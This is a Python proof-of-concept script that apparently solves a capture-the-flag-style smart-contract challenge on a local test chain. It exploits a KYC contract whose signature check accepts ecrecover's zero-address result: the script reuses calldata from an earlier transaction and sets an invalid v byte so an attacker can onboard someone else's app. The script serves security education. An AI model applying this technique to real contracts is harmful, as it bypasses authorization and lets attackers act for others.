from ape import accounts, project, chain
from .utils.helper import w3, get_block
from eth_account.messages import encode_defunct
import eth_abi


def deploy(deployer, user_1, user_2):

    # deploy challenge contracts
    print("\n--- Deploying Challenge Contracts ---\n")
    kyc = project.KYC.deploy(sender=deployer)

    app_1 = project.KYCApp.deploy(sender=user_1)

    app_2 = project.KYCApp.deploy(sender=user_2)

    return kyc, app_1, app_2


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # get accounts
    deployer = accounts.test_accounts[0]
    user_1 = accounts.test_accounts[1]
    user_2 = accounts.test_accounts[2]
    attacker = accounts.test_accounts[3]

    # get challenge contracts
    kyc, app_1, app_2 = deploy(deployer, user_1, user_2)

    kyc.applyFor(app_1.address, sender=user_1)

    user_1_hash = "0x0123456789012345678901234567890123456789012345678901234567890123"
    user_1_message = "I'm signing the message!"

    payload = eth_abi.encode(
        ["bytes32", "string"], [bytes.fromhex(user_1_hash[2:]), user_1_message]
    )
    payload_hash = encode_defunct(w3.keccak(payload))

    user_1_signature = user_1.sign_message(payload_hash).encode_rsv()

    assert (
        w3.eth.account.recover_message(payload_hash, signature=user_1_signature)
        == user_1.address
    )
    kyc.onboardWithSig(
        app_1.address,
        user_1_hash,
        user_1_message,
        user_1_signature,
        sender=user_1,
    )
    assert kyc.onboardedApps(app_1.address)

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    # The vulnerability is found inside the `_checkWhiteListed()` function in the
    # KYC contract. The function checks the address retrived from ercrecover against
    # the whitelistedOwner mapping. However, if someone is trying to onboard an app without
    # the owner applying for the app, through the `applyFor()` function, then the whitelistedOwners
    # mapping will return the zero address. Therefore, an attacker only needs to call the
    # `onboardWithSig()` function with a signature of valid length, but one that will cause the
    # ercrecover function to fail and return the zero address. This will allow them to onboard an App
    # and pass the check in the `_checkWhiteListed()` function. In order to make the ercrevocer function
    # fail the attacker can use an invalid `v` value. I.e. not 27 or 28. In the POC below I did more than
    # what is necessary. I could have simply created a signature from a hash and message myself and modified
    # the `v` value of the signature. However, I wanted to demonstrate how an Attacker could recover the
    # signature from a previous transaction. It was also a good exercise to reason about calldata.
    function_sig = w3.keccak(
        text="onboardWithSig(address,bytes32,string,bytes)",
    )[:4]

    for tx in chain.provider.get_transactions_by_block(get_block()):
        if (
            tx.sender == kyc.whitelistedOwners(app_1.address)
            and tx.data[:4] == function_sig
        ):
            tx_params = tx.data[4:]
            break

    hash = tx_params[32:64].hex()  # msgHash is the 1st item in calldata params
    message_length = int(
        tx_params[128:160].hex(), 0
    )  # description length is the 3rd item in calldata params.
    message = tx_params[160 : 160 + message_length].decode(
        "utf-8"
    )  # the description is the 4th item in the calldata params
    signature_length = int(
        tx_params[192:224].hex(), 0
    )  # the signature length is the 6th item in calldata params
    signature = tx_params[
        224 : 224 + signature_length
    ]  # signature is 7th item in calldata params 32 * 7 = 224

    new_v = 32  # randomly selected

    signature_modified = signature[:-1] + int(new_v).to_bytes(1, byteorder="big")

    kyc.onboardWithSig(
        app_2.address,
        hash,
        message,
        signature_modified,
        sender=attacker,
    )

    # --- AFTER EXPLOIT --- #
    print("\n--- The Attacker onboarded App2 without its owner's approval ---\n")

    assert kyc.onboardedApps(app_2.address)

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
